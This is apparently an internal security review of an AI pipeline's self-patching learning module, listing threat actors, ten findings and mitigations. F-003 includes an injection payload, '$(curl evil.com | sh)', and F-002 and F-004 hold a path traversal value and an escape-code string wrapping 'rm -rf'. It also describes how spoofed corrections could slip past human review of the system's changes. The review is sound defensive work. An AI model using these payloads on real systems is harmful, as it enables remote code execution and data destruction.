# Task-011: Real-Time Learning — Security Review

**Stage:** security | **Status:** pass
**Phase:** 5.7 of IMPROVEMENT_PLAN
**Date:** 2026-02-19T02:41:00-05:00
**Author:** Pipeline Security Specialist
**Scope:** Full threat model audit of `realtime-learning/` module (~12 files, ~900 lines TypeScript)
**Prior stages reviewed:** requirements.md, design.md, build-report.md

---

## 1. Review Methodology

This review audits the Real-Time Learning system for:

1. **Input trust boundaries** — which inputs are treated as trusted vs. untrusted
2. **Auto-commit attack surface** — whether the SOP auto-patch/git commit path can be hijacked
3. **Correction scanner spoofing** — whether crafted messages can inject false correction events
4. **Database injection** — user-controlled strings flowing into SQL queries
5. **Cascade amplification** — whether a single crafted input can trigger disproportionate propagation
6. **Synapse broadcast trust** — whether cross-system relay can be weaponized for lateral influence
7. **Tier 3 preview bypass** — whether the human-in-the-loop requirement for high-risk changes can be circumvented

Source reviewed: requirements.md, design.md, build-report.md, module layout from design §2.

---

## 2. Threat Model

The Real-Time Learning system has a uniquely broad attack surface because it:

- Reads user messages in real-time (correction scanner)
- Writes to SOP files and commits to git automatically
- Posts to Synapse on behalf of Helios
- Generates and registers regression test stubs
- Stores failure descriptions (which may contain attacker-controlled content) in brain.db

This creates four distinct threat actors:

| Actor                          | Motivation                                                                | Capability                                                                            |
| ------------------------------ | ------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| **Malicious pipeline webhook** | Trigger false SOP patches via crafted failure descriptions                | Can inject arbitrary `failure_desc` content via Synapse topic `pipeline:stage-result` |
| **Crafted user message**       | Trigger false correction events → unwanted SOP modification               | Can craft messages containing correction keywords                                     |
| **Compromised upstream event** | Poison failure event queue from task-003/010                              | Can emit `sop:violation` or `trust:demotion` events with attacker-controlled context  |
| **Recursive self-injection**   | Failure from a previous SOP patch triggers another patch, creating a loop | System writes SOP → SOP violation detected → new patch queued                         |

---

## 3. Findings

### F-001 — HIGH: Correction Scanner Accepts Pipeline Webhook Content as "User Messages"

**Component:** `correction-scanner.ts`
**Risk:** External pipeline webhook messages can trigger false `CORRECT` failure events

The correction scanner monitors session messages for correction keywords within a 5-minute window after any tool call. The design does not distinguish between:

- Messages authored by Matthew (trusted corrections)
- System messages from webhooks, cron jobs, and Synapse relays

**Scenario:** A pipeline webhook containing text like `"use this instead of the old approach"` — a correction keyword — arrives within 5 minutes of a tool call. The scanner emits a `CORRECT` failure event. The classifier tags it `stale_sop`. The SOP patcher appends an additive rule to an SOP file and auto-commits.

This is not hypothetical: the pipeline trigger that invoked THIS security stage contains the text `"Stage complete"` — structurally similar to messages that will appear in the 5-minute window.

**Mitigations:**

1. **Source tagging is mandatory**: The correction scanner MUST distinguish message sources. Only messages with `source=user` (Matthew) qualify for correction detection. System events, webhook injections, Synapse relays, and cron job messages must be excluded.
2. **Message origin metadata required**: `onUserMessage()` interface must require a `source: 'user' | 'system' | 'agent'` field. Events with `source != 'user'` are silently dropped by the scanner.
3. **Additional guard**: require at least one personal pronoun + correction keyword combination — Matthew's corrections read as "you used the wrong X" not just "wrong X" alone. This is a defense-in-depth filter, not a primary control.

**Status:** Must be addressed before deploy.

---

### F-002 — HIGH: SOP File Path Derived from Failure Context — Path Traversal Risk

**Component:** `sop-patcher.ts`
**Risk:** Attacker-controlled `context.sop_file` can cause writes outside `~/Projects/helios/sops/`

From design §6.1:

> Locate the relevant SOP file using the `context.sop_file` field or by scanning `~/Projects/helios/sops/`

If `context.sop_file` is populated from a `sop:violation` event (task-003 relay) and that event's `sopFile` field is attacker-controlled (e.g., via a compromised hook configuration), the patcher could write to an arbitrary path:

```
context.sop_file = "../../config/realtime-learning.json"
→ writeFile("~/Projects/helios/sops/../../config/realtime-learning.json", patch)
→ overwrites the learning system's own config
```

**Scenario:** Poison the `sop:violation` event's `sopFile` to point at a non-SOP file (config, DB, bin script). The patcher appends "correction" content to that file, corrupting it.

**Mitigations:**

1. **Path allowlist**: Before any write, resolve the absolute path and verify it starts with the canonical SOP directory (`~/Projects/helios/sops/` resolved absolute). Reject anything outside.
2. **Extension check**: Only write to `.md` or `.txt` files — reject `.ts`, `.json`, `.sh`, `.sql`.
3. **No path from untrusted event context**: `context.sop_file` must only be used as a _search hint_ (keyword to scan against known SOP files), never as a direct write target. The actual write target must come from a controlled SOP directory scan, not from event data.

**Status:** Must be addressed before deploy.

---

### F-003 — HIGH: Failure Description → Git Commit Message Injection

**Component:** `sop-patcher.ts` commit message construction
**Risk:** Attacker-controlled `failure_desc` field appears in git commit messages

From design §6.1:

```
git commit -m "fix(sop): auto-patch from failure ${failureId} [realtime-learning]"
```

The commit message uses `failureId` (a random hex ID), not `failure_desc` — so this specific pattern is safe. However, the `failure_desc` field originates from:

- `tool-monitor.ts`: `event.error ?? \`exit ${event.exitCode}\`` — safe (system-generated)
- `correction-scanner.ts`: the raw user message — **attacker-controlled**
- `hook-violation-relay.ts`: `event.sopFile` + `event.ruleId` — hook config-controlled
- `pipeline-fail-relay.ts`: the `message` field from the stage result — **webhook-controlled**

If any downstream code path includes `failure_desc` in a git commit message, shell command, or file path, shell injection is possible.

**Concretely:** A pipeline stage result with `message: "Stage complete $(curl evil.com | sh)"` arriving as `failure_desc` in a `PIPE_FAIL` event could be interpolated into a shell command if any propagation code builds shell strings from failure context.

**Mitigations:**

1. **Never interpolate `failure_desc` into shell commands**: All git operations must use `execa` (array form, not template strings) so no shell expansion occurs.
2. **Sanitize before DB write**: Strip shell metacharacters (`$`, `` ` ``, `|`, `;`, `&&`, `||`) from `failure_desc` before inserting into brain.db.
3. **ID-based references only in shell/git**: Commit messages, CLI calls, and file names must reference only the immutable `failure.id` — never `failure.desc` or `failure.root_cause`.

**Status:** Must be addressed before deploy.

---

### F-004 — MEDIUM: SQL Injection via Root Cause Label in Recurrence Query

**Component:** `recurrence-detector.ts`
**Risk:** `failure.root_cause` passed as query parameter — verify parameterization

From design §7:

```sql
SELECT id, detected_at, propagation_status
FROM failure_events
WHERE root_cause = ? AND id != ? AND detected_at > ?
```

The design shows parameterized queries (`?` placeholders), which is correct. However, root_cause labels come from the classifier's `rootCauseLabel` field — which is hardcoded in `RULES[]` for known patterns, but defaults to `'unknown'` for unmatched failures. No risk in the known rules.

**The actual risk**: the `failure_desc` or `context` JSON stored in brain.db may contain payloads that are later retrieved and rendered in the `~/bin/failure-log` CLI without sanitization, creating a stored XSS analog (terminal escape code injection).

**Scenario:** An attacker crafts a correction message containing terminal escape codes or ANSI injection: `"wrong path\x1b[31m; rm -rf ~/Projects/helios/sops/\x1b[0m"`. This gets stored as `failure_desc`, then rendered in the CLI table. If `failure-log` uses raw string interpolation in the table renderer, the escape codes execute.

**Mitigations:**

1. **Verify all DB queries use parameterized form** — the design shows `?` placeholders; enforce this in code review.
2. **CLI output sanitization**: Before rendering in `failure-log` table, strip ANSI escape codes from `failure_desc` using a standard sanitizer (e.g., `strip-ansi`).
3. **Store truncated failure_desc**: Cap `failure_desc` at 512 characters on insert — prevents payload embedding.

**Status:** Medium risk — address before test stage.

---

### F-005 — MEDIUM: Cascade Loop — SOP Patch Triggers Hook Violation → New Failure Event

**Component:** `sop-patcher.ts` + `hook-violation-relay.ts` interaction
**Risk:** SOP auto-patch causes a hook violation event, which queues a new failure, which triggers another patch

**Scenario:**

1. Failure event fires → SOP patcher updates `~/Projects/helios/sops/exec.md`
2. The update adds a new rule to the SOP
3. A concurrent task-003 hook check against the newly-written SOP fires a `sop:violation` event (transient — the file was mid-write)
4. `hook-violation-relay.ts` enqueues a `SOP_VIOL` failure event
5. The SOP patcher patches the SOP again (creating a loop)

This is low probability but unbounded — under adversarial conditions it could be triggered repeatedly to flood `failure_events` and `propagation_records`, exhausting disk space.

**Mitigations:**

1. **SOP patch source tagging**: SOP file writes made by `sop-patcher.ts` must set a `_patching` flag (or write a lock file) that causes `hook-violation-relay.ts` to suppress violation events for that file during the write window (500ms).
2. **Loop detection**: If the same `root_cause` fires more than 3 times within 60 seconds, suspend propagation for that root_cause and emit a Synapse alert instead of patching.
3. **Propagation rate limiter**: The async queue must enforce a maximum dispatch rate of 5 propagation operations per 10 seconds (configurable in `realtime-learning.json`). Queue overflow → Synapse escalation, not silent drop.

**Status:** Must be addressed before deploy.

---

### F-006 — MEDIUM: Cross-System Relay Broadcasts to 'all' Agents Without Scope Limiting

**Component:** `cross-system-relay.ts`
**Risk:** A single crafted infrastructure failure can broadcast Synapse messages to all agents simultaneously

From design §6.5:

```typescript
await synapse.send({ to: 'all', ... priority: 'action' });
```

Broadcasting with `priority: 'action'` to `'all'` on every cross-system failure means:

- A flood of false `PIPE_FAIL` or `TOOL_ERR` events could trigger dozens of Synapse broadcasts per second
- All agents (AUGUR, etc.) would receive low-quality `action`-priority noise
- If an agent reacts to these broadcasts (e.g., AUGUR pausing trades), this creates a denial-of-service vector via infrastructure events

**Mitigations:**

1. **Targeted relay over broadcast**: `cross-system-relay.ts` should identify the specific responsible agent via `context.domain` mapping and send only to that agent, not `'all'`. If domain is unknown, send to `'helios'` + `'all'` as fallback.
2. **Rate limit cross-system broadcasts**: Maximum 2 cross-system Synapse messages per failure event, with a 30-second cooldown per `root_cause`.
3. **Priority downgrade**: Cross-system relay should use `priority: 'info'` by default; only escalate to `'action'` after Matthew approves via preview (Tier 3).

**Status:** Address before deploy.

---

### F-007 — MEDIUM: Regression Test Stubs Written to Source Tree with Attacker-Controlled Names

**Component:** `regression-test-gen.ts`
**Risk:** Generated test file paths include `failure.type` and `failure.root_cause` — may allow path injection

From design §6.4:

```
src/realtime-learning/__tests__/regression/
  "regression: ${failure.type} — ${failure.root_cause} (${failure.id}).test.ts"
```

The test filename includes `failure.root_cause` which, while constrained by the classifier's hardcoded labels in normal operation, could contain unexpected values if an `'unknown'` failure passes through with a crafted `root_cause` override (if the classifier's fallback path is exploitable).

More critically: the test file is written to the source tree. If an attacker can influence the test stub body (via `failure_desc`), they can write arbitrary TypeScript to a `.test.ts` file that will be executed when `pnpm test` runs.

**Mitigations:**

1. **Sanitize filename components**: Only allow `[a-z0-9\-_]` characters in `failure.root_cause` when used in filenames. Replace all other characters with `-`.
2. **Stub body is static template only**: The regression test stub body must be a **static template** with only the `failure.id` (UUID) interpolated — never `failure_desc`, never any attacker-reachable string. The test description is a static literal; the failure ID is used only as an identifier in a comment.
3. **Separate regression dir from source tree**: Write generated tests to `~/Projects/helios/extensions/cortex/__generated__/regression/` — outside the `src/` source tree. Keep source tree clean.

**Status:** Must be addressed before deploy.

---

### F-008 — LOW: `realtime-learning.json` Config Modification Could Disable Safety Controls

**Component:** `~/Projects/helios/config/realtime-learning.json`
**Risk:** Config file controls safety thresholds; no integrity protection

The config controls:

- `correction_scan_window_ms` — set to 0 to disable correction detection
- `tier3_default_on_timeout` — already `"skip"` (don't commit), which is safe
- `sop_auto_commit_types` — could be extended to `["additive", "modifying"]` to bypass Tier 3 review
- `preview_ttl_minutes` — set to 1 to make Tier 3 previews expire before Matthew can respond

If any code path writes back to this config file (e.g., a bug in `sop-patcher.ts` that writes to the config dir instead of the SOP dir), safety thresholds could be silently disabled.

**Mitigations:**

1. **Config is read-only at runtime**: No code path should write to `realtime-learning.json`. Enforce with a file permission check on module load (`chmod 444` or check `fs.access` write mode and log a warning if writable by unexpected paths).
2. **Hash the config on startup**: Store a SHA-256 of the config file in memory on module init. If the hash changes at runtime without a restart, emit a `CRITICAL` Synapse alert.
3. **`tier3_default_on_timeout` must remain `"skip"`**: Enforce this in the schema validator — reject configs where this field is anything other than `"skip"`.

---

### F-009 — LOW: Atom Propagator Creates Atoms with Session ID from Failure Context

**Component:** `atom-propagator.ts`
**Risk:** `session_id` in failure context flows into atom subject field

From design §6.3:

```typescript
subject: `failure:${failure.type}:${failure.id}`,
action: `triggered by ${failure.root_cause} in session ${failure.context.session_id}`,
```

The `failure.context.session_id` is system-generated (safe), but the `outcome` and `consequences` fields are derived from `propagationTargets.join(', ')` — which is also system-generated. No direct attacker-controlled content flows into atom fields.

**Minor risk**: the `failure_desc` is not included in atoms (by design), which is correct. Confirm this is enforced in `atom-propagator.ts` and that no future refactor includes it.

**Mitigation:** Document explicitly in the code: `// SECURITY: failure_desc is intentionally excluded from atom fields. Never add it.`

---

### F-010 — INFORMATIONAL: Weekly Metrics Cron Posts to Synapse

**Component:** `metrics-emitter.ts` + deploy-stage cron
**Risk:** If metrics SQL queries include user-controlled content in output, Synapse report contains injected text

The weekly metrics report computes aggregates via SQL (AVG, COUNT, CAST) — no user-controlled content in the query output itself. The report is numeric only (T2P in seconds, percentages). No injection risk at the current design.

**Note:** If the report is ever expanded to include `failure_desc` samples ("top 5 failure descriptions this week"), the injection risk from F-004 applies. Document this constraint for future authors.

---

## 4. Auto-Commit Controls Assessment

The most sensitive capability in task-011 is the **automatic git commit of SOP changes**. The following table audits each commit path:

| Path                          | Commit Trigger           | Content Control                      | Auto-commit Safe?                                     |
| ----------------------------- | ------------------------ | ------------------------------------ | ----------------------------------------------------- |
| `TOOL_ERR` + `wrong_path`     | SOP patcher, additive    | System-generated path correction     | ⚠️ Safe IF F-002 path validation is implemented       |
| `CORRECT` + `stale_sop`       | SOP patcher, additive    | Correction keyword match + proximity | ❌ Not safe until F-001 source tagging is implemented |
| `SOP_VIOL` + `stale_sop_rule` | SOP patcher, additive    | Hook event context                   | ⚠️ Safe IF F-002 path validation is implemented       |
| `TRUST_DEM`                   | Tier 3 preview required  | Matthew approval required            | ✅ Safe                                               |
| `PIPE_FAIL`                   | Regression test gen only | Static template, failure.id only     | ⚠️ Safe IF F-007 filename sanitization is implemented |
| Hook pattern update           | Additive only            | Pattern derived from classification  | ✅ Safe (pattern is from hardcoded rule labels)       |

**Verdict:** Auto-commit is acceptable **only after F-001 and F-002 are addressed**. Until then, all SOP patches should route through Tier 3 preview as a temporary safety measure.

---

## 5. Tier 3 Preview Integrity Assessment

The Tier 3 human-in-the-loop mechanism is the last line of defense for high-risk changes. Assessment:

| Check                                                           | Result                                 |
| --------------------------------------------------------------- | -------------------------------------- |
| Tier 3 triggers on trust demotion events                        | ✅ By design (TRUST_DEM always Tier 3) |
| Tier 3 triggers on SOP modifications (non-additive)             | ✅ By design                           |
| Preview TTL default (10 min) is reasonable                      | ✅ Adequate for async review           |
| Default-on-timeout is `"skip"` (don't commit)                   | ✅ Correct safe default                |
| Can Tier 3 be bypassed by manipulating the tier classification? | ⚠️ See below                           |

**Tier 3 bypass risk**: The tier is assigned in the classifier based on failure type. A `CORRECT` event is always Tier 2. But if the correction scanner is spoofed (F-001) to generate a `CORRECT` event from a pipeline message, that event bypasses Tier 3 review (since it's Tier 2) and auto-commits an SOP patch.

**Mitigation:** F-001 fix (source tagging) directly closes this bypass. Additionally: if `failure.root_cause == 'unknown'`, escalate to Tier 3 regardless of the event's nominal tier.

---

## 6. Coverage Gaps

| Gap                                                                                                    | Risk                                                                                                                               |
| ------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------- |
| No audit of `hook-pattern-updater.ts` (design only — pattern addition logic)                           | LOW — additive-only patterns, but need to verify no shell expansion in pattern strings                                             |
| Concurrent failure events from multiple relays (race on propagation_status update)                     | LOW — SQLite serializes writes; potential double-propagation if two workers both read `pending` before either writes `in_progress` |
| `failure-log` CLI rendering of multi-byte Unicode in failure descriptions                              | LOW — terminal rendering edge cases                                                                                                |
| Interaction with task-010's trust tier: if task-011 generates false corrections, does trust fluctuate? | MEDIUM — need explicit isolation: real-time learning events must NOT feed back into task-010 trust scoring                         |

---

## 7. Required Mitigations (Priority Order)

| Priority           | Finding | Action                                                                      | Blocking?                |
| ------------------ | ------- | --------------------------------------------------------------------------- | ------------------------ |
| P0 (before deploy) | F-001   | Add source tagging to correction scanner; drop non-user-source messages     | ✅ Yes — blocks deploy   |
| P0 (before deploy) | F-002   | Add path allowlist + extension check to SOP patcher                         | ✅ Yes — blocks deploy   |
| P0 (before deploy) | F-003   | Use execa array form for all git ops; sanitize failure_desc before DB write | ✅ Yes — blocks deploy   |
| P0 (before deploy) | F-005   | Add cascade loop detection (3 same root_cause in 60s → suspend + alert)     | ✅ Yes — blocks deploy   |
| P0 (before deploy) | F-007   | Sanitize regression test filenames; static template only for stub body      | ✅ Yes — blocks deploy   |
| P1 (before test)   | F-004   | CLI output sanitization (strip ANSI); cap failure_desc at 512 chars         | ⚠️ Needed for test stage |
| P1 (before test)   | F-006   | Targeted Synapse relay (not broadcast); rate limit cross-system messages    | ⚠️ Needed for test stage |
| P2 (backlog)       | F-008   | Config integrity hash on startup; enforce tier3_default_on_timeout=skip     | No — defense-in-depth    |
| P3 (code comment)  | F-009   | Add security comment to atom-propagator.ts excluding failure_desc           | No — documentation       |

---

## 8. Verdict

| Criterion                                     | Status                                                   |
| --------------------------------------------- | -------------------------------------------------------- |
| Auto-commit controls sound                    | ⚠️ CONDITIONAL — safe only after F-001 + F-002           |
| No path traversal in SOP patcher              | ❌ FAIL — F-002 must be fixed                            |
| Correction scanner limited to trusted sources | ❌ FAIL — F-001 must be fixed                            |
| Git operations injection-safe                 | ❌ FAIL — F-003 must be fixed                            |
| Cascade loop protection present               | ❌ FAIL — F-005 must be fixed                            |
| Regression test stubs safe                    | ❌ FAIL — F-007 must be fixed                            |
| Tier 3 human-in-the-loop intact               | ⚠️ CONDITIONAL — depends on F-001 fix                    |
| Database queries parameterized                | ✅ PASS (as designed)                                    |
| Sandbox/production state isolation            | ✅ PASS — no external writes until propagation committed |
| Weekly metrics cron safe                      | ✅ PASS                                                  |

### **Overall: CONDITIONAL PASS — cleared for `test` stage with P0 mitigations required before deploy**

The architecture is sound and the design intent correctly models a human-in-the-loop system. The five P0 findings are not architectural flaws — they are implementation gaps that are straightforward to close. No redesign is required.

**Specific deploy-blocking issues (P0):**

- F-001: Correction scanner must filter by message source (user-only)
- F-002: SOP patcher must enforce path allowlist
- F-003: Git/shell operations must not interpolate attacker-controlled strings
- F-005: Cascade loop detection must be present before any production traffic
- F-007: Regression test file generation must use sanitized names and static templates

These five mitigations are additive code changes (input validation, allowlists, loop guards) — none require design changes. The test stage can proceed while P0 mitigations are implemented in parallel; deploy stage will verify all P0 findings are resolved before go-live.

---

_Security review conducted by: Pipeline Security Specialist_
_Artifacts reviewed: requirements.md, design.md, build-report.md, task-007/security.md (reference)_
_Next stage: test_
